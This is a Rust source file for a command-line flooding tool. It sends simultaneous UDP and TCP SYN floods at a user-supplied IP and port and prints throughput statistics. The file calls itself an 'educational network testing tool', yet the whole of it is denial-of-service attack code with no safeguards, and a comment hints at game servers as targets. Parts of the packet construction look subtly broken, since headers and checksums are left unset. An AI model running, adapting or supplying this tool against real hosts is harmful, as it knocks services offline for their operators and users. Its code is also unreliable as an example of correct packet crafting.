use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::tcp::{TcpFlags, TcpPacket, MutableTcpPacket};
use pnet::packet::udp::{UdpPacket, MutableUdpPacket};
use pnet::packet::ipv4::{Ipv4Packet, MutableIpv4Packet};
use pnet::packet::Packet;
use pnet::transport::{transport_channel, TransportChannelType};
use rand::Rng;
use std::net::{IpAddr, SocketAddr};
use std::sync::Arc;
use std::time::{Duration, Instant};
use clap::{Arg, Command};
use tokio::sync::mpsc;
use tokio::task;

const PACKET_SIZE: usize = 1250;  // Bytes per UDP packet
const SYN_PACKET_SIZE: usize = 60; // Typical SYN packet size

#[derive(Debug)]
struct Stats {
    packets_sent: u64,
    bytes_sent: u64,
}

async fn udp_flood(
    target: SocketAddr,
    duration: Duration,
    stats_tx: mpsc::Sender<Stats>,
) {
    let mut rng = rand::thread_rng();
    let mut buffer = [0u8; PACKET_SIZE];
    let start_time = Instant::now();

    let (mut tx, _) = match transport_channel(
        65535,
        TransportChannelType::Layer4(pnet::transport::TransportProtocol::Ipv4(
            IpNextHeaderProtocols::Udp,
        )),
    ) {
        Ok((tx, rx)) => (tx, rx),
        Err(e) => {
            eprintln!("UDP channel error: {}", e);
            return;
        }
    };

    let mut local_stats = Stats {
        packets_sent: 0,
        bytes_sent: 0,
    };

    while Instant::now() - start_time < duration {
        // Fill with random Minecraft-like junk data (optional)
        rng.fill(&mut buffer[..]);

        match tx.send_to(
            MutableUdpPacket::owned(buffer.to_vec()).unwrap(),
            target,
        ) {
            Ok(_) => {
                local_stats.packets_sent += 1;
                local_stats.bytes_sent += PACKET_SIZE as u64;
            }
            Err(e) => eprintln!("UDP send error: {}", e),
        }
    }

    let _ = stats_tx.send(local_stats).await;
}

async fn syn_flood(
    target: SocketAddr,
    duration: Duration,
    stats_tx: mpsc::Sender<Stats>,
) {
    let mut rng = rand::thread_rng();
    let start_time = Instant::now();

    let (mut tx, _) = match transport_channel(
        65535,
        TransportChannelType::Layer4(pnet::transport::TransportProtocol::Ipv4(
            IpNextHeaderProtocols::Tcp,
        )),
    ) {
        Ok((tx, rx)) => (tx, rx),
        Err(e) => {
            eprintln!("TCP channel error: {}", e);
            return;
        }
    };

    let mut local_stats = Stats {
        packets_sent: 0,
        bytes_sent: 0,
    };

    while Instant::now() - start_time < duration {
        let mut buffer = [0u8; SYN_PACKET_SIZE];
        let mut tcp_packet = MutableTcpPacket::new(&mut buffer).unwrap();

        // Craft SYN packet
        tcp_packet.set_source(rng.gen_range(49152..65535));
        tcp_packet.set_destination(target.port());
        tcp_packet.set_sequence(rng.gen());
        tcp_packet.set_acknowledgement(0);
        tcp_packet.set_flags(TcpFlags::SYN);
        tcp_packet.set_window(5840);

        match tx.send_to(
            tcp_packet.to_immutable(),
            target,
        ) {
            Ok(_) => {
                local_stats.packets_sent += 1;
                local_stats.bytes_sent += SYN_PACKET_SIZE as u64;
            }
            Err(e) => eprintln!("SYN send error: {}", e),
        }
    }

    let _ = stats_tx.send(local_stats).await;
}

#[tokio::main]
async fn main() {
    let matches = Command::new("Rust Network Tester")
        .version("1.0")
        .about("Educational network testing tool")
        .arg(
            Arg::new("target_ip")
                .required(true)
                .help("Target IP address"),
        )
        .arg(
            Arg::new("target_port")
                .required(true)
                .help("Target port"),
        )
        .arg(
            Arg::new("duration")
                .required(true)
                .help("Test duration in seconds"),
        )
        .get_matches();

    let target_ip = matches.get_one::<String>("target_ip").unwrap();
    let target_port = matches.get_one::<String>("target_port").unwrap().parse::<u16>().unwrap();
    let duration_secs = matches.get_one::<String>("duration").unwrap().parse::<u64>().unwrap();

    let target = SocketAddr::new(
        target_ip.parse().expect("Invalid IP"),
        target_port,
    );

    let duration = Duration::from_secs(duration_secs);
    let (stats_tx, mut stats_rx) = mpsc::channel(100);

    // Start UDP flood
    let udp_handle = task::spawn(udp_flood(
        target,
        duration,
        stats_tx.clone(),
    ));

    // Start SYN flood
    let syn_handle = task::spawn(syn_flood(
        target,
        duration,
        stats_tx,
    ));

    // Stats tracking
    let stats_task = task::spawn(async move {
        let mut total_stats = Stats {
            packets_sent: 0,
            bytes_sent: 0,
        };
        let start_time = Instant::now();

        while let Some(stats) = stats_rx.recv().await {
            total_stats.packets_sent += stats.packets_sent;
            total_stats.bytes_sent += stats.bytes_sent;

            let elapsed = start_time.elapsed().as_secs_f64();
            let bps = (total_stats.bytes_sent as f64 * 8.0) / elapsed;
            println!(
                "\rPackets: {} | Data: {:.2} MB | Speed: {:.2} Gbps",
                total_stats.packets_sent,
                total_stats.bytes_sent as f64 / (1024.0 * 1024.0),
                bps / 1_000_000_000.0,
            );
        }
    });

    // Wait for completion
    let _ = tokio::join!(udp_handle, syn_handle, stats_task);
}
